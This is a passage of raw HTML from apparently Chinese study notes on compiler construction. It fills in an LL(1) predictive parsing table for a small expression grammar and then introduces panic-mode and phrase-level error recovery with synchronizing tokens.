class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>ϵ</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo>+</mo><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(+TE&#x27;|\epsilon)=\{+,\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">ϵ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">+</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mclose">}</span></span></span></span>有空串，更准确的说是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>ϵ</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(\epsilon)=\{\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">ϵ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">ϵ</span><span class="mclose">}</span></span></span></span>中有空串，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>贡献的。</p><p>便去看<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi mathvariant="normal">$</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Follow(E&#x27;)=\{\$\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">$</span><span class="mclose">}</span></span></span></span>，于是将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>写入M[E’, $]中。</p><table><thead><tr><th></th><th>id</th><th>+</th><th><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></th><th>$</th></tr></thead><tbody><tr><td>E</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow T E&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td></td><td></td><td></td></tr><tr><td>E’</td><td></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></td></tr></tbody></table><p>再去看最后一个产生式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mo>→</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">T\rightarrow id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span></span></span></span>。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>i</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>i</mi><mi>d</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(id)=\{id\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mclose">}</span></span></span></span>。</p><p>填表。</p><table><thead><tr><th></th><th>id</th><th>+</th><th><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></th><th>$</th></tr></thead><tbody><tr><td>E</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow T E&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td></td><td></td><td></td></tr><tr><td>E’</td><td></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></td></tr><tr><td>T</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mo>→</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">T\rightarrow id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span></span></span></span></td><td></td><td></td><td></td></tr></tbody></table><p>现在我们处理好了每个产生式。然后将表中所有的空闲位置都加上错误标志即可。</p><table><thead><tr><th></th><th>id</th><th>+</th><th><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></th><th>$</th></tr></thead><tbody><tr><td>E</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow T E&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td>错误</td><td>错误</td><td>错误</td></tr><tr><td>E’</td><td>错误</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></td></tr><tr><td>T</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mo>→</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">T\rightarrow id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span></span></span></span></td><td>错误</td><td>错误</td><td>错误</td></tr></tbody></table><p>这便是预测分析表的构造过程了。</p><h3 id="预测分析中的错误恢复"><a class="markdownIt-Anchor" href="#预测分析中的错误恢复"></a> 预测分析中的错误恢复</h3><p>当预测分析器报错时，标识输入的串不是句子</p><p>对于使用者而言，希望预测分析器能够进行恢复处理后继续语法分析过程，以便在一次分析中找到更多的语法错误</p><p>但是有可能恢复的并不成功，之后找到的语法错误有可能是假的</p><p>进行错误恢复时可用的信息：栈里的符号，待分析的符号</p><p>两类错误恢复方法：</p><ol><li>恐慌模式</li><li>短语层次的恢复</li></ol><h3 id="恐慌模式"><a class="markdownIt-Anchor" href="#恐慌模式"></a> 恐慌模式</h3><p>语法分析器忽略输入中的一些符号，直到出现由设计者 选定的某个同步词法单元</p><p>同步词法单元就是这个程序结构结束的标志</p><blockquote><p>我在词法分析实验中时，发现一个单词不符合某个模式后，就一直找到换行符。换行符前面的单词截取出来报错。</p></blockquote><p><img src="https://upyun.wuuconix.link/image-20211111222848122.png" alt="同步词法单元确定的启发性规则" /></p><p>这里举一个例子。</p><p><img src="https://upyun.wuuconix.link/image-20211111224336159.png" alt="例子" /></p><p>这里的文法在书本P138。这里摘录一下。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27; | \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">ϵ</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mo>→</mo><mi>F</mi><msup><mi>T</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">T\rightarrow FT&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span 